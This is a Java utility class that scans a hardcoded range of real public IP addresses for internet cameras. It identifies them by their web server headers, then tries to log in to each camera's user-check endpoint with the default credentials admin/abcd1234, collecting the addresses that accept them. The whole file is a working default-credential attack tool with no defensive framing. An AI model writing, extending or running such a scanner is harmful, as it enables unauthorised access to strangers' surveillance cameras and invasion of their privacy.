package com.cam.util;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.Map;

public class IPService {

    private final String DEFAULT_USER = "admin";

    private final String DEFAULT_PASS = "abcd1234";

    private final int NUMBER_OF_THREADS = 100;

    private final int NUMBER_OF_ITEMS = 100;
    private final String END_URL = "/ISAPI/Security/userCheck";

    private final String SCHEMA = "http://";

    private final String START_RANGE = "113.166.0.0";

    private final String END_RANGE = "113.166.1.255";

    private final List<String> items = Arrays.asList("web", "App-webs/", "Webs", "DNVRS-Webs", "webserver");

    public boolean login(String ip, String password) {

        boolean isLogin = false;

        try {

            URL url = new URL(SCHEMA + ip + END_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();

            String userpass = DEFAULT_USER + ":" + password;
            String basicAuth = "Basic " +  new String(Base64.getEncoder().encode(userpass.getBytes()));

            conn.setRequestMethod("GET");
            conn.setRequestProperty("Accept", "application/json");
            conn.setRequestProperty ("Authorization", basicAuth);
            conn.setConnectTimeout(2000);
            conn.setReadTimeout(2000);

            if (conn.getResponseCode() == 200) {
                isLogin = true;
            }

            conn.disconnect();

        } catch (MalformedURLException e) {

            e.printStackTrace();

        } catch (IOException e) {

            e.printStackTrace();

        }

        return isLogin;

    }

    public void findCamIp(String ip, List<String> ips) {

        try {

            URL url = new URL(SCHEMA + ip);

            HttpURLConnection conn = (HttpURLConnection) url.openConnection();

            conn.setConnectTimeout(500);
            conn.setReadTimeout(500);

            Map<String, List<String>> hdrs = conn.getHeaderFields();

            List<String> server = hdrs.get("Server");

            if (conn.getResponseCode() == 200 &&
                    server.size() != 0 &&
                    items.stream().anyMatch(server.get(0)::contains)) {

                System.out.println(SCHEMA + ip + " " + server.get(0));

                if (login(ip, DEFAULT_PASS)) {
                    ips.add(SCHEMA + ip);

                    System.out.println(SCHEMA + ip);
                }

            }

            conn.disconnect();

        } catch (MalformedURLException e) {
            throw new RuntimeException(e);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

    }
}
